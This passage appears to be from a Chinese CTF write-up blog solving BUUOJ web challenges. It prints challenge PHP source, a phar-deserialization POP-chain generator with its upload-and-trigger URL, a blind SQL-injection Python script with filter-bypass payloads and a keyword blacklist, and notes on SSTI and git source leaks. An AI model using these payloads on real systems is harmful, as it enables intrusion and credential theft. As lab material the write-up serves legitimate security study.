class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;查看文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt; </span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="function-php"><a href="#function-php" class="headerlink" title="function.php"></a>function.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h5 id="class-php-1"><a href="#class-php-1" class="headerlink" title="class.php"></a>class.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="file-php"><a href="#file-php" class="headerlink" title="file.php"></a>file.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h5 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php"></a>upload_file.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">upload_file</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charest=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;文件上传&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;div align = <span class="string">&quot;center&quot;</span>&gt; </span><br><span class="line">        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">&lt;div&gt; </span><br><span class="line">&lt;form action=<span class="string">&quot;upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名:&lt;/label&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>审计后发现使用<code>phar</code>协议解题，寻找可用<code>POP</code>链条</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents() &lt;-- Test::get() &lt;-- Test::__get() &lt;-- Show::toString() &lt;-- C1e4r::__destruct()</span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//反序列化payload构造</span></span><br><span class="line"><span class="comment">// class TestObject &#123;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例一个phar对象供后续操作，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line"><span class="comment">//开始缓冲对phar的写操作 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾*/</span></span><br><span class="line"><span class="comment">/*$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将反序列化的对象放入该文件中</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="comment">//将自定义的归档元数据meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;evo1ution&quot;</span>); </span><br><span class="line"><span class="comment">//停止缓冲对phar的写操作</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改<code>phar.phar</code>后缀为<code>.jpg</code>上传，在<code>/upload</code>目录下找到上传的文件的名称，结合<code>file.php</code>即可获得<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file.php?file=phar://upload/42574e9d70ad4a54c530fd9a294a46dc.jpg</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>访问<code>/robots.txt</code>发现<code>/hint.txt</code>，访问后获取到提示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure><p>登陆后发现没东西，还是要注密码（这里说一下%00虽然被过滤了，但是直接输入%00可以防止二次编码，进而达到截断的作用）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=||/**/1;%00&amp;username=a\</span><br></pre></td></tr></table></figure><p>用正则去注密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&#x27;_&#x27;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">url = <span class="string">&quot;http://b56aae62-943a-4d88-9c57-c3f29054954b.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp(&quot;^&#123;&#125;&quot;);&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(passwd+j,parse.unquote(<span class="string">&#x27;%00&#x27;</span>)),</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;a\\&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        response = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">            passwd += j</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you_will_never_know7788990</span></span><br></pre></td></tr></table></figure><p>登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=you_will_never_know7788990&amp;username=evo1</span><br></pre></td></tr></table></figure><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>用<a href="https://github.com/s0md3v/Arjun">Arjun</a>爆破下得到参数<code>name</code>，直接打没过滤的ssti即可</p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>发布后会提示登陆，发现帐号给了密码还剩三位，爆破下可以得到账号密码为<code>zhangwei:zhangwei666</code>，登陆进去也不知道干嘛，扫一下发现<code>git</code>源码泄露，使用<a href="https://github.com/gakki429/Git_Extract">git_extract</a>下载下来，有两个文件，一份残缺的一份完整的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 